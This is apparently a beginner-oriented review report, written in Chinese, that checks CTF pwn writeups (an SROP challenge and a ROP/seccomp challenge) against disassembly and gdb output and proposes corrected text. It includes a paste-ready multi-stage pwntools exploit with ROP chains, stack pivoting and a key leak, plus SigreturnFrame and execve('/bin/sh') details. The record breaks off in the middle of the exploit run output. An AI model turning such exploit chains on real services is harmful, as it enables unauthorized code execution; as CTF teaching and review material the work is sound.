# Review Round 2 — pwn writeup（讀者設定：完全沒學過 ROP/SROP、沒寫過 exploit）

審查範圍（**只讀不改**，本次不動任何其他檔案）：

| 檔案 | 行數（本次審查時） |
|---|---|
| `pwn1/notes.md` | 652 |
| `pwn1/exploit.py` | 149 |
| `pwn7/notes.md` | 958 |
| `pwn7/exploit.py` | 175 |

驗證工具：`objdump -d -M intel`、`readelf -S/-l/-n`、`file`、`gdb -q -batch`（自建輸入檔、強制固定
XOR key、印暫存器／記憶體）、`python3`（pwntools `SigreturnFrame` 偏移、`ELF().checksec()`）、
`python3 exploit.py`（local）與 `python3 exploit.py REMOTE`（各 1 次，全 PASS）。
所有 gdb 腳本都可以由第 1、3、4 節的指令重跑。

**結論先講**：round 1 的 16 個 E 全部**確實有改**，而且我逐條重驗後**都改對了**（只有 E16 的
替代文字留了一個小錯，見 E4）。但這次仍有 **7 條事實／一致性錯誤**（其中 2 條中等），
以及**一條會讓新手完全跑不起來的斷點**：`pwn7/notes.md` §7 的三階段 exploit 片段
**缺少 5 個 `recvuntil` 同步點與 `d1`/`d2` 的組裝程式碼**，照抄會把 `OK\n` 當成 key 的前 4 bytes。

---

## 1. 仍未修正的錯誤

### E1 ★（中等）pwn7：另外兩個 fd 槽開的是 `/dev/null`，不是 `flag.txt`；而且 fd 槽其實有 4 個

* **檔案／行號**
  * `pwn7/notes.md` 第 **437** 行（§4.1 組語清單最後一行）
  * `pwn7/notes.md` 第 **448** 行（「迴圈在那裡停」）
  * `pwn7/exploit.py` 第 **26** 行（檔頭註解）
* **原文**
  > `4017f8:  (迴圈) 再開 2 個 flag.txt 放進 0x40548c / 0x405898`
  >
  > （槽的大小是 `0x40c`，所以 `0x405080 + 3*0x40c = 0x405ca4`，**迴圈在那裡停**。）
  >
  > （exploit.py 第 26 行）`#             另外 2 個 fd 槽也開 flag.txt`
* **正確是什麼**
  1. 迴圈裡的 `open` 用的是 **`rbp`**：`0x4017fa: mov rdi,rbp`，而 `0x40178e` 把
     `rbp` 設成 `0x40306f = "/dev/null"`（`0x403079` 才是 `"flag.txt"`，那是第一次
     `open` 用的常數，沒有被迴圈重用）。所以**迴圈開的是 `/dev/null`，不是 flag.txt**。
  2. 迴圈是**先寫槽、後比較**（`0x401806 mov [rbx],0x2` → `0x40180c call open` →
     `0x401814 cmp rbx,r12` → `jne`），所以 `r12 = 0x405ca4` 那一個槽**也會被寫進去**，
     之後才停。實際的 fd 槽（`state = 2`）共 **4 個**：
     ```
     0x405080  fd 槽 #0  flag.txt        ← index = -4 打到這裡
     0x40548c  fd 槽 #1  /dev/null
     0x405898  fd 槽 #2  /dev/null
     0x405ca4  fd 槽 #3  /dev/null       ← 迴圈多跑一次寫的，寫完才停
     ```
  （本題利用不受影響：只有 `index = -4 → 0x405080` 是 flag fd；`-8` 是 `0x404050`、
  `-12` 是 `0x403020`，都不是槽。但讀者若照原句去猜「負更多就能打到別的 flag fd」會白費功夫。）
* **驗證指令**
  ```bash
  cd pwn7
  # (1) 看字串位址
  objdump -s -j .rodata service | sed -n '1,3p'      # 40306f = "/dev/null", 403079 = "flag.txt"

  # (2) 實際在 vault 裡看 open 的引數（父行程 dup2 後才 fork，所以直接跟 child）
  cat > /tmp/p7fd.gdb <<'EOF'
  set pagination off
  set confirm off
  set follow-fork-mode child
  b *0x40180c
  commands 1
    printf "[loop open] rdi=%#lx \"%s\"  this_slot=%#lx\n", $rdi, (char*)$rdi, $rbx+0x40c
    continue
  end
  run
  EOF
  gdb -q -batch -x /tmp/p7fd.gdb ./service
  ```
  實際輸出（本機實跑）：
  ```
  [loop open] rdi=0x40306f "/dev/null"  this_slot=0x40548c
  [loop open] rdi=0x40306f "/dev/null"  this_slot=0x405898
  [loop open] rdi=0x40306f "/dev/null"  this_slot=0x405ca4
  ```
* **建議替換文字**
  * `pwn7/notes.md` 第 437 行：
    ```asm
    4017f8:  (迴圈，注意引數是 rbp)  再開 3 次 /dev/null 放進 0x40548c / 0x405898 / 0x405ca4
                                      ; rdi 由 0x4017fa 的 `mov rdi,rbp` 決定，而 rbp = 0x40306f = "/dev/null"
    ```
  * `pwn7/notes.md` 第 448 行：
    ```markdown
    （槽的大小是 `0x40c`。`r12 = 0x405080 + 3*0x40c = 0x405ca4` 是迴圈的**比較值**，
    但比較在寫槽之後才做，所以 `0x405ca4` 這一個槽也會被寫入 `state = 2` 才跳出。
    因此 fd 槽共 4 個：`0x405080`（flag.txt）、`0x40548c`、`0x405898`、`0x405ca4`（後 3 個都是 /dev/null）。）
    ```
  * `pwn7/exploit.py` 第 26 行：
    ```python
    #             另外 3 個 fd 槽開的是 /dev/null（0x40548c / 0x405898 / 0x405ca4，都是 state=2）
    #             只有 0x405080 才是 flag.txt 的 fd
    ```
  * 另外 §6.2 的 `.bss` 記憶體圖（`pwn7/notes.md` 第 667–669 行）建議補一行
    `0x405ca4  fd 槽 #3 {state=2, fd=/dev/null}`，否則讀者對「槽大小 0x40c」的推導會少一格。

### E2 ★（中等）pwn1：「3 次 read、2 次 send」與自己下面的表格矛盾

* **檔案／行號**：`pwn1/notes.md` 第 **490** 行
* **原文**
  > 整題總共只有 **3 次 read、2 次 send**，順序如下（一定要照這個順序）：
* **錯在哪**：同一段的表格自己列了 **3 次送資料**（第 1 列 `b"A"*0x18`、第 2 列第一段 payload、
  第 3 列 15 bytes），`pwn1/exploit.py` 也確實是 3 次 `p.send()`（第 86、122、130 行）＋最後
  第 136 行送 shell 指令。「2 次 send」應該是作者想說「payload 只分兩次送（0x400 + 15）」，
  但寫成「整題總共」就會讓新手以為第一個 24 bytes 不用送 → exploit 直接卡死。
* **驗證指令**
  ```bash
  grep -n "p\.send" pwn1/exploit.py        # 86: send(b"A"*0x18)  122: send(payload)  130: send(15 bytes)
  sed -n '490,499p' pwn1/notes.md          # 表格有 3 列「我們送什麼」
  ```
* **建議替換文字**
  ```markdown
  整題總共只有 **3 次 read、3 次 send**（第 1 次是墊檔的 24 bytes，第 2、3 次才是
  payload 的兩段），順序如下（一定要照這個順序）：
  ```

### E3（中等）pwn1：§3.3 表格最後一列的 `[rsp]` 用附的腳本跑不出來

* **檔案／行號**：`pwn1/notes.md` 第 **237** 行（同節第 250–290 行的「怎麼自己重現這張表」）
* **原文**
  > `0x40106b  ret 前        :  rsp=0x7fffffffdf08   [rsp]=0x000000000040100a`
* **錯在哪**：`[rsp]` 在 `0x40106b` 就是**返回位址那一格**（`buf+0x80`）。照第 257–286 行的
  重現步驟餵的是**會溢位的 payload**（`b'B'*0x80 + p64(0x40104f) + …`），所以那一格已經被
  我們蓋成 `0x40104f` 了；只有「餵的輸入不夠長（`read` 回傳 0、沒有溢位）」時才會看到原始的
  `0x40100a`。表格給的值與腳本給的輸入互相矛盾，新手會以為自己算錯。
* **驗證指令**（兩個輸入檔各跑一次）
  ```bash
  cd pwn1
  python3 -c "open('/tmp/short.bin','wb').write(b'A'*0x18)"        # 不溢位
  cat > /tmp/t3.gdb <<'EOF'
  set pagination off
  set confirm off
  b *0x40106b
  commands 1
    printf "[0x40106b] rsp=%#lx [rsp]=%#lx rax=%lu\n", $rsp, *(unsigned long*)$rsp, $rax
    continue
  end
  run < /tmp/short.bin
  EOF
  gdb -q -batch -x /tmp/t3.gdb ./challenge
  # 再把 /tmp/short.bin 換成 notes 第 264 行產生的 /tmp/in.bin 跑一次
  ```
  實際輸出：
  ```
  # 輸入只有 24 bytes（不溢位）
  [0x40106b] rsp=0x7fffffffdf18 [rsp]=0x40100a rax=0
  # 輸入是 notes 的 /tmp/in.bin（會溢位）
  [0x40106b] rsp=0x7fffffffdf18 [rsp]=0x40104f rax=0x400
  ```
* **建議替換文字**（把那一列換成兩列並加註）
  ```
  0x40106b  ret 前（餵滿 payload）: rsp=0x7fffffffdf08  [rsp]=0x000000000040104f  ← 已經被我們蓋掉了
  0x40106b  ret 前（餵 24 bytes）  : rsp=0x7fffffffdf08  [rsp]=0x000000000040100a  ← 只有不溢位時才是原值
  ```
  並在表格下方補一句：
  > ⚠️ `0x40106b` 的 `[rsp]` 就是**返回位址那一格**。用第 6 節的 payload 跑，它會顯示
  > 你自己寫進去的 `0x40104f`（這正是「溢位成功」的證據）；想看到原始的 `0x40100a`，
  > 就在 `0x40104f` 只餵 24 bytes（`read` 會回傳 0，不覆蓋）。

### E4（低）pwn7：§9 #3 說「`add rsp,0x40; pop rbx; ret` 返回」——那裡沒有 `ret`

* **檔案／行號**：`pwn7/notes.md` 第 **910** 行
* **原文**
  > 跳到 `0x401f38` 後印出 `ERR bad size` 就 `add rsp,0x40; pop rbx; ret` 返回。
* **正確是什麼**：`0x401f38` 之後是
  ```
  401f38: add    rsp,0x40
  401f3c: mov    edx,0xd
  401f41: mov    edi,0x1
  401f46: lea    rsi,[rip+0x10d1]        # 40301e "ERR bad size\n"
  401f4d: pop    rbx
  401f4e: jmp    401190 <write@plt>       ← 尾呼叫（tail call），不是 ret
  ```
  結尾是 `jmp write@plt`（`write` 返回後直接回到呼叫端），跟 `0x401f34` 的 `ret` 不同。
  這是 round 1 E16 修正文字時新寫進去的句子，所以列在這裡。
* **驗證指令**
  ```bash
  cd pwn7 && objdump -d -M intel --start-address=0x401f38 --stop-address=0x401f58 service
  printf 'SUBMIT 256\n' | ./service        # 回 ERR bad size（實測相符）
  ```
* **建議替換文字**
  ```
  跳到 `0x401f38` 後印出 `ERR bad size` 就 `add rsp,0x40; …; pop rbx; jmp write@plt`
  （尾呼叫，不是 `ret`）返回命令迴圈。
  ```

### E5（低）pwn1：`csgsfs` 不是「`0x33` / `0x2b`」兩個值，實測只有 `cs = 0x33`

* **檔案／行號**：`pwn1/notes.md` 第 **429–430** 行
* **原文**
  > 用 pwntools 產生的 frame 會填好合理的預設值（`csgsfs` 會被設成 `0x33` / `0x2b` 之類的正確值）。
* **正確是什麼**：`bytes(SigreturnFrame())[0xb8:0xc0]` = `33 00 00 00 00 00 00 00`，
  也就是 **`cs = 0x33`、`gs = 0`、`fs = 0`**（x86-64 的 `sigcontext` 只有 `cs/gs/fs` 三個 u16；
  `0x2b` 是 32-bit 相容模式的 segment，不會出現在這題的 frame 裡）。寫成「0x33 / 0x2b 之類」
  會讓想手刻 frame 的人以為要填兩個值。
* **驗證指令**
  ```bash
  python3 -c "
  from pwn import *; context.clear(arch='amd64')
  print(bytes(SigreturnFrame())[0xb8:0xc0].hex())"     # 3300000000000000
  ```
* **建議替換文字**
  ```
  用 pwntools 產生的 frame 會填好合理的預設值（實測 bytes(frame)[0xb8:0xc0] =
  `33 00 00 00 00 00 00 00`，也就是 cs = 0x33 = 64-bit user code segment，gs/fs = 0）。
  ```

### E6（低）pwn7：§2.2 的組語範圍寫太寬

* **檔案／行號**：`pwn7/notes.md` 第 **131** 行
* **原文**
  > 所以 `service` 裡 `0x40132c`~`0x4014a0` 那一堆 `movabs` + `mov [rsp+0x4xx],rax`
* **正確是什麼**：真正在「把 21 條 BPF 指令寫到堆疊」的指令範圍是
  **`0x401339`（第一條 `movabs`）～ `0x40146f`（`mov [rsp+0x28],rbp`）**。
  `0x401474` 已經是 `call prctl@plt`、`0x401479`~`0x401494` 是 `seccomp()` 的
  `call syscall@plt`。讀者若照這個範圍 dump，會混進 prctl / syscall 的引數設定，容易誤判。
* **驗證指令**
  ```bash
  cd pwn7 && objdump -d -M intel --start-address=0x40132c --stop-address=0x4014a0 service
  ```
* **建議替換文字**
  ```
  所以 `service` 裡 `0x401339`~`0x40146f` 那一堆 `movabs` + `mov [rsp+0x4xx],rax`
  就是在**一條一條把 21 條指令寫到堆疊上**（`0x401474` 之後是 `prctl` 與 `seccomp` 的呼叫）。
  ```

### E7（低）pwn7：§6 說「我挑的兩個片段」，但表格列了 3 個

* **檔案／行號**：`pwn7/notes.md` 第 **598** 行
* **原文**：`我挑的兩個片段（都是函式中間，位址剛好可以用）：`
* **正確是什麼**：下面表格有 3 列（`0x401f07`、`0x401fda`、`0x401c32`），而且下一段還特別介紹
  第 3 個。新手會以為自己漏看了一個（或以為 `0x401c32` 不算 gadget）。
* **驗證方式**：讀 `pwn7/notes.md` 第 598–604 行。
* **建議替換文字**：`我挑的三個片段（都在函式中段，位址剛好可以用）：`

---

## 2. round 1 修正的驗證結果（逐條）

### 2.1 嚴重錯誤 E1 ~ E16

| # | 狀態 | 我的重驗方式與結果 |
|---|---|---|
| E1 | **已正確修好** | `pwn7/notes.md` 第 949–950 行已是「鏈一開始 `rax = 3`（被 SUBMIT 的 `write(1,"OK\n",3)` 蓋掉）… 只洩漏 6 bytes」。gdb 實測：鏈的第一個 gadget（`0x401529`）時 `rax=3`，兩次 `write` 為 `rdi=1, rsi=0x405060 / 0x405063, rdx=3` → 6 bytes ✅ |
| E2 | **已正確修好** | 第 840–841 行改為 `rsp = A3 + 0x50`；第 855 行 `RESP = (A3+0x50)+0x10 = A3+0x60`。gdb 實測 `[0x401fda] rsp=0x40a330 rbx=0x40a340`（A3 = 0x40a2e0）→ `rsp = A3+0x50`、`rsp+0x10 = A3+0x60 = RESP`，`rbx` 也等於 `RESP` ✅。「`0x401fb9` 不會執行」的補充也正確（我們是 `ret` 到 `0x401fda` 中段）✅ |
| E3 | **已正確修好** | `pwn7/notes.md` §6（第 590–596 行）與 §9 #5（第 917–920 行）都改成「binary 沒有 `pop rdx`」，並註明 wrapper 動的是 `rdi`/`rcx`/`r8`/`r9`；`exploit.py` 第 41–44 行同步 ✅。我用本機 glibc 反組譯重驗：`write`/`read` wrapper 只有 `movsxd rdi,edi`、`xor r9d,r9d`、`xor r8d,r8d`、`xor ecx,ecx`，**完全沒碰 `rdx`** ✅ |
| E4 | **已正確修好** | `pwn1/notes.md` 第 523 行寫「`0x40104f` 讀進來的資料從 `buf + 0x08` 開始」；第 527 行補「15 bytes 蓋在 `buf+0x08`~`buf+0x16` 的 padding」。gdb 實測：第一次 read `rsi=0x…de98`、第二次 `rsi=0x…dea0`（差 0x08）✅ |
| E5 | **已正確修好** | `pwn7/notes.md` 第 326 行已補 `401fb2: xor eax,eax`，第 329 行說明改為「`ax` 此時是 0（因為上一條 `xor eax,eax`）」，`test al,al` 已移除 ✅（反組譯相符） |
| E6 | **已正確修好**（`wp/99_速查表.md`，範圍外但一併查） | 第 170–180 行已是 `+0x00 prev_size` / `+0x08 size` / `+0x10 user data（malloc 回傳）`，free 表也有 fd/bk 在 +0x10/+0x18 ✅ |
| E7 | **已正確修好** | `pwn1/notes.md` 第 314 行改為「唯一『syscall 後面接 ret』的位置」，第 317–320 行補「全檔 4 條 syscall」；`exploit.py` 第 58–59 行同步 ✅（`objdump \| grep syscall` = 4 筆） |
| E8 | **已正確修好** | `pwn7/notes.md` 第 66 行、`exploit.py` 第 14 行都是 `.bss:0x405060` ✅（`readelf -S`：`.data` = 0x405000+0x10、`.bss` = 0x405020+0x5360） |
| E9 | **已正確修好**（`wp/00`，範圍外） | 第 109 行 `gem install seccomp-tools   # 注意：這是 Ruby gem，不是 pip 套件（要先裝 ruby）` ✅ |
| E10 | **已正確修好**（`wp/99`，範圍外） | 第 198 行 `p = process('./chal')`（冒號已移除）✅ |
| E11 | **已正確修好**（`wp/00`，範圍外） | 第 507–511 行：`call` 前 `rsp % 16 == 0`、被呼叫函式第一道指令時 `rsp % 16 == 8`，並說明對齊用 `ret` ✅ |
| E12 | **已正確修好** | `pwn7/notes.md` 第 184 行「共 0x400 bytes」，第 218 行「最大長度 0x81f-0x420 = 0x3ff」✅（`0x4014b5: lea rbx,[rsp+0x81f]`、`0x401530: mov BYTE PTR [rsp+0x81f],0x0` 相符） |
| E13 | **已正確修好** | `pwn1/notes.md` 第 452–453 行改為「`0x401016` 那個 leak 函式用 `push rsp` + `write(1,rsp,8)`（跟 sigreturn 無關）」✅ |
| E14 | **已正確修好** | `pwn7/notes.md` 第 611–627 行補上完整 `0x401c20` 組語與「跳進函式中段 → `pop rbx` 不會執行」的說明 ✅（反組譯：`pop rbx` 在 0x401c31、`mov rdx,rax` 在 0x401c32、`jmp write@plt` 在 0x401c35 ✅） |
| E15 | **已正確修好** | `pwn1/notes.md` 第 405 行 `0xb8  8 (用到 6)  csgsfs … 所以 err 從 0xc0 開始` ✅（實測 `csgsfs` 佔 0xb8~0xbf、`err` 在 0xc0 ✅） |
| E16 | **已修好，但替代文字本身留了一個小錯** | `pwn7/notes.md` 第 907–913 行已改成「還沒進 `read` 就被 `0x401eed test al,al` / `0x401eef je 0x401f38` 擋掉 → 印 `ERR bad size`」✅（`printf 'SUBMIT 256\n' \| ./service` 實測相符）。但第 910 行寫成「`add rsp,0x40; pop rbx; ret` 返回」→ 應是 `jmp write@plt`（見本報告 E4） |

### 2.2 新手卡點 B1 ~ B18（只列有變動／需要檢查的）

| # | 狀態 | 重驗結果 |
|---|---|---|
| B1 | **有補，但只涵蓋一半** | `pwn1/notes.md` 第 250–290 行的腳本我**逐字照跑**，能跑、能重現「4 次命中 `0x401069`」與差值 `0x08` / `0x90` ✅。但腳本只有 `0x401054`、`0x401069` 兩個中斷點，**重現不了表格的 6 列**（`0x401016`/`0x401017`/`0x401031`/`0x401032`/`0x40104f`/`0x40106b`），而且 `0x40106b` 那列的值與腳本輸入互相矛盾（見 **E3**）。→ 建議見第 3 節 B3 |
| B2 | **已正確補上** | 第 478–486 行「為什麼 `payload.ljust(0x400)` 不能省」內容正確（送太多會被下一次 read 吃掉 → `rax` 不是 15；送太少不影響流程）✅ |
| B3 | **有補，但開頭數字寫錯** | 第 490–499 行的「誰吃掉哪個 payload」表格與記憶體圖都正確、很有用 ✅，但標題句「3 次 read、2 次 send」是錯的（見 **E2**） |
| B4 | **已正確補上** | 第 334–341 行的四名詞表（`rt_sigframe` / `ucontext` / `struct sigcontext` / `sigframe`）正確 ✅ |
| B5～B18 | **已補／已修**（多數在 `wp/00`、`wp/99`，範圍外但一併抽查） | little-endian 定義（00 第 69 行）、§12 端序提醒（00 第 738 行）、shellcode/TLS/ZF 定義（00 第 70/170/272 行）、`context.arch` 提醒（00 第 603、99 第 118 行）、佔位符提醒（00 第 465 行）、`ld-linux-x86-64.so.2` 統一（00 第 645/863 行）、flag 檔命名規則（00 第 890 行）、canary/RELRO 名詞列（00 第 67–68 行）都查到 ✅。B18「略過」的理由我重跑確認：`pwn1`~`pwn7` 的 `notes.md` **全部存在** ✅ |

### 2.3 T1~T15 / S1~S7

| 項目 | 狀態 | 重驗結果 |
|---|---|---|
| T1–T15 | **已處理** | 抽查到 `non-PIE`（00 §3 第 129 行附近）、`.got.plt` 指向 §8、`@plt` 說明（99 §4）、`hook` 定義（99 §8）皆已存在 ✅ |
| S1 / B18 | **略過正確** | `for d in pwn1..pwn7; do [ -f $d/notes.md ]` → 全 YES ✅ |
| S2 / B8 | **已補** | pwn1 §9（第 649–652 行）、pwn7 §10（第 955–958 行）都有「一定要 `cd` 進題目目錄」與 `wp/run_all.sh` ✅ |
| S3 / B7 | **已補** | `pwn1/notes.md` §7 第 593–608 行有本地輸出與「`flag.txt` 是假 flag」說明；`exploit.py` 第 145 行訊息已改 ✅ |
| S4 | **部分已補** | `recvn(6)` / `recvall(3)` 已在 pwn7 §7 解釋 ✅（第 796、869–871 行）。但 notes 仍**沒有**引用 `recvuntil(b'OK\n')` 這 5 個同步點，這正是第 3 節 B1 的斷點 |
| S5 | **已補且與實際輸出相符** | pwn7 §1 的 7 行 checksec 與我實跑 `ELF().checksec()` 完全一致（含 `RUNPATH: b'$ORIGIN'`、`SHSTK: Enabled`、`IBT: Enabled`）✅；pwn1 §1 五行也一致（`readelf -l` 確認只有 2 個 LOAD、沒有 `GNU_STACK`）✅ |
| S6 | **已修** | `00` 第 344 行「`offset = (rbp - &buf) + 8` 完全等價」；pwn7 §10 的漏洞編號（1 SUBMIT／2 RELAY len=0／3 負索引）與 §6、`exploit.py` 一致 ✅ |
| S7 | **已正確補上** | `pwn7/notes.md` 第 822–829 行「第 9 個 byte 是 `d2[8]`（= 0x00），留在 socket 裡等下一次讀標頭；這不是通則」✅ |

**§2 小結：round 1 的 16 個 E、B、T、S 全部**確實套用**且**內容正確**，
沒有「宣稱改了但沒改」或「改錯方向」的情形。唯一新問題是 E16 的替代句自己寫錯了指令（E4）。**

---

## 3. 新手仍會卡住的地方（可直接貼上的補充）

### B1 ★★★（最嚴重）`pwn7/notes.md` §7 的 exploit 片段**照抄跑不起來**：缺 5 個同步點與 `d1`/`d2` 組裝

`pwn7/notes.md` 第 744–838 行只給了「chain 的清單」，但實際 `pwn7/exploit.py` 還需要：

* `io.recvuntil(b'sh> ')`（開場、以及每次 NOTE 之後）
* `io.recvuntil(b'OK\n')` × 3（SUBMIT 自己的、`0x401f07` 那次 read 的、寫完封包那次 read 的）
* `d1 = bytearray(b'\0' * 255)`、`d1[0x40] = 0xff`、`d1[0x48:…] = …`
* `assert len(stage) == 112`

少了這些，第一次 `io.recvn(6)` 收到的會是 `b'OK\n' + key[0]`，**key 直接錯 4 個 byte**，
之後整條鏈全部失敗（而且症狀是「什麼都沒印」或「莫名斷線」，非常難查）。

**建議在 §7 開頭插入（可直接貼上）**：

````markdown
> ⚠️ 完整程式在 `pwn7/exploit.py`，下面只貼關鍵片段。**照抄時不要漏掉「等提示字元／等 `OK\n`」的
> 那幾行**：`SUBMIT`、以及每一次 `read(0, rsp, bl)` 讀完之後，程式都會印 `OK\n`。
> 如果沒把它收乾淨，它就會被當成「key 的前 4 bytes」，整條鏈會用錯的 key 加密而失敗。

```python
io = start()
io.recvuntil(b'sh> ')                                   # ① 等第一個提示字元

io.send(b'NOTE 0 ' + p64(SUBMIT_READ)[:3] + b'\n')      # 階段 0
io.recvuntil(b'sh> ')                                   # ② 等 NOTE 完成

stage  = b'A' * 64 + p64(0xff) + p64(POP_RSP) + p64(PIVOT_TOP) + p64(0) * 3
assert len(stage) == 112
io.send(b'SUBMIT %d\n' % len(stage) + stage)            # 階段 1
io.recvuntil(b'OK\n')                                   # ③ SUBMIT 自己的 OK\n

# ---- 階段 2：把鏈放進 255 bytes 的緩衝區 ----------------------------------
d1 = bytearray(b'\0' * 255)        # 長度 = 0x401f07 的 bl（由 stage 的 p64(0xff) 決定）
d1[0x40] = 0xff                    # → 下一次 read 的長度
chain  = [POP_RDI, 1, POP_RSI, KEY, WRITE_RDX_RAX,
          POP_RSI, KEY + 3, WRITE_RDX_RAX,
          POP_RBX, 0xff, SUBMIT_READ]
A2 = A1 + 0x48 + 8 * len(chain)    # 下一段的 read 位址
d1[0x48:0x48 + 8 * len(chain)] = b''.join(p64(x) for x in chain)   # 鏈從 A1+0x48 開始
io.send(bytes(d1))
io.recvuntil(b'OK\n', timeout=3)   # ④ 這次 read 印的 OK\n
leak = io.recvn(6, timeout=3)      # ⑤ 6 bytes 才是 key（前 4 bytes）
key = leak[:4]

# ---- 階段 3：同一個模式，只是把 write 的 fd 改成 3 -------------------------
d2 = bytearray(b'\0' * 255)
d2[0:8] = xor_key(p8(3) + b'\x00\x04' + p8(0) + p32(0xfffffffc), key)
chain  = [POP_RDI, 3, POP_RSI, A2, WRITE_RDX_RAX,
          POP_RSI, A2 + 3, WRITE_RDX_RAX,
          POP_RSI, A2 + 6, WRITE_RDX_RAX,
          POP_RBX, 0xff, SUBMIT_READ]
A3 = A2 + 0x48 + 8 * len(chain)
RESP = A3 + 0x60
d2[0x48:0x48 + 8 * len(chain)] = b''.join(p64(x) for x in chain)
io.send(bytes(d2))
io.recvuntil(b'OK\n', timeout=3)   # ⑥ 這次 read 印的 OK\n

# ---- 階段 4 ---------------------------------------------------------------
time.sleep(0.7)
d3 = bytearray(b'\0' * 120)
d3[0x40:0x48] = p64(RESP)
d3[0x48:0x50] = p64(RELAY_RX)
io.send(bytes(d3))
print(io.recvall(timeout=3))
```
````

同時建議把「`d1` / `d2` / `d3` 是什麼」明講一次（現在的 §7 只出現 `d2[8]`，卻從沒定義 `d2`）：
> `d1`/`d2` 是「一段鏈的完整輸入」＝ `bytearray(b'\0' * 255)`（255 = 那次 `read` 的 `bl`），
> 其中 `[0x40]` 放 `rbx`（下一段的長度）、`[0x48]` 開始放鏈。`d3` 只用到前 `0x50` bytes，
> 所以給 120 bytes 也夠。

### B2 ★★ `pwn7/notes.md` 沒有說「完整程式在 `pwn7/exploit.py`」

`pwn1/notes.md` 第 442 行有「完整程式在 `pwn1/exploit.py`」，但 pwn7 全篇只在執行指令
（第 878、955 行）提到 `exploit.py`。新手在 §7 卡住時不會知道那邊有可跑版本。
**建議在 §7 標題下加一句**：
> 完整、可直接執行的程式在 `pwn7/exploit.py`；本文只拆解關鍵段落。

### B3 ★★ `pwn1/notes.md` §3.3 的「重現腳本」只涵蓋 6 列中的 2 列

**建議把第 267–286 行的 gdb 腳本換成下面這個（可直接貼上，會印出表格每一列）**：

````markdown
```gdb
set pagination off
set confirm off
b *0x401016
b *0x401017
b *0x401031
b *0x401032
b *0x40104f
b *0x40106b
commands 1
  printf "[0x401016 進入 leak]      rsp=%p\n", $rsp
  continue
end
commands 2
  printf "[0x401017 push rsp 之後]  rsp=%#lx   [rsp]=%#lx\n", $rsp, *(unsigned long*)$rsp
  continue
end
commands 3
  printf "[0x401031 pop rax 之前]   rsp=%p   [rsp]=%#lx\n", $rsp, *(unsigned long*)$rsp
  continue
end
commands 4
  printf "[0x401032 pop rax 之後]   rsp=%p   rax=%#lx\n", $rsp, $rax
  continue
end
commands 5
  printf "[0x40104f 進入 vuln]      rsp=%p   [rsp]=%#lx\n", $rsp, *(unsigned long*)$rsp
  continue
end
commands 6
  printf "[0x40106b ret 前]         rsp=%p   [rsp]=%#lx\n", $rsp, *(unsigned long*)$rsp
  continue
end
run < /tmp/in.bin
```
````
（我在本機實跑，輸出形如 `[0x401016 進入 leak] rsp=0x7fffffffdf18`、
`[0x401017 push rsp 之後] rsp=0x7fffffffdf10 [rsp]=0x7fffffffdf18`、
`[0x40104f 進入 vuln] rsp=0x7fffffffdf18 [rsp]=0x40100a` —— 與表格的前幾列一致。）

### B4 ★ pwn7：`fd` 這個詞從來沒被定義過（`wp/00` 也沒有）

pwn7 §2.1 直接說「兩種互相連通的 `fd`」、§4.1 說「flag 的 fd」、§4.4 說 `pread(fd, …)`。
完全新手不知道 `fd` 是什麼、為什麼會「只有子行程有 flag 的 fd」。
**建議在 §2.1 開頭加**：
> `fd`（file descriptor，檔案描述元）＝ 核心給「每個被打開的檔案／socket／管道」的編號，
> 程式就用這個編號讀寫（0 = stdin、1 = stdout、2 = stderr，之後開的從 3 開始）。
> `open()` 回傳 fd、`read(fd, …)` / `write(fd, …)` 用它。本題父子行程就是**共用同一組 fd 編號表
> 的複製品**，`dup2(sv[0], 3)` 的意思是「把 sv[0] 這條 socket 複製到編號 3」。

### B5 ★ pwn7：`read()` 的長度與「實際交付幾個 byte」沒說清楚

`d1`/`d2` 為什麼一定要 255 bytes、`d3` 為什麼只要 0x50 就夠，notes 沒交代。
**建議在 §7 階段 2 之前加**：
> `read(0, rsp, bl)` 的 `bl` 由鏈上的 `POP_RBX` 決定（我們放 `0xff` = 255），
> 但 `read` **回傳的是「這次實際收到幾個 byte」**，不是 255。所以：
> * 我們用**一次** `io.send()` 把整段 `d1`（255 bytes）送出去 → 核心一次交付，鏈完整。
> * `d3` 只需要覆蓋到 `+0x50`（rbx 與 ret 目標），所以 120 bytes 就夠。
> * 反過來說，**不能**把 `d1` 切成好幾次小 `send()`：`read` 可能只收到前半段，
>   鏈就會用半截資料執行而 crash。

### B6 ★ pwn1：§7 的 exploit 尾段（取 flag）沒有解釋

`pwn1/exploit.py` 第 135–138 行有 `time.sleep(0.5)`、`time.sleep(1.5)`、`p.recvrepeat(3)`，
notes 完全沒提（pwn7 有解釋 `time.sleep` 與 `recvall`，pwn1 沒有）。
**建議在 §6 步驟 6 之後加**：
> `execve("/bin/sh")` 之後我們是在跟一個 shell 講話，所以要**等一下**再送指令
> （`time.sleep(0.5)`），送完再等它輸出（`time.sleep(1.5)`）。
> `p.recvrepeat(3)` = 「一直收到 3 秒內沒有新資料為止」（等同 `recvall(timeout=3)`），
> 因為我們不知道 flag 有幾個 byte。最後用 `re.search(rb"[A-Za-z0-9_]+\{[^}]*\}", out)`
> 把 `sun{…}` 抓出來。

### B7 ★ pwn1：`frame.rsp` 為什麼是 `sh_addr + 0x200`？

notes §5.3 寫 `frame.rsp = 某個合法位址`、§6 步驟 5 的圖寫 `rsp = sh_addr + 0x200`，
但沒說 exploit 就是這樣寫、也沒說為什麼這個位址合法。
**建議補一句**：
> `frame.rsp` 只要是「合法、可寫的位址」就好（`execve` 成功的話根本用不到它；
> 失敗時才會拿它當堆疊繼續跑）。本題取 `buf + 0x1a0 + 0x200 = buf + 0x3a0`，
> 仍在我們那 0x400 bytes 的輸入區內，一定合法。

### B8 pwn7 §9 #4 的「`buf`」指的是 `read` 的目標，不是 SUBMIT 的緩衝區

原文「所以鏈的起點在 `buf + 0x48`、`rbx` 在 `buf + 0x40`」裡的 `buf` 是「這一段 read 的
目標位址」（階段 2 之後是 `A1`/`A2`/`A3`），不是 `SUBMIT` 的 `rsp`。
**建議改成**：
> 所以每一段鏈的佈局是：`read 目標 + 0x40` = `rbx`、`read 目標 + 0x48` = 鏈的第 0 個 qword
> （階段 1 的「read 目標」是 `SUBMIT` 當時的 `rsp`；階段 2 之後是 `A1` / `A2` / `A3`）。

---

## 4. 實測結果（真實輸出）

執行的指令與環境：在題目目錄下 `python3 exploit.py`（`< /dev/null`）與 `python3 exploit.py REMOTE`，
`context.log_level='info'`（與檔案預設相同），4 支全部**一次成功**。

### 4.1 pwn1 本地 — **PASS**

```
$ cd pwn1 && python3 exploit.py
[x] Starting local process './challenge'
[+] Starting local process './challenge': pid 3531484
[+] stack leak  = 0x7fff176b2ca8
[*] vuln buffer = 0x7fff176b2c28

[+] raw output:
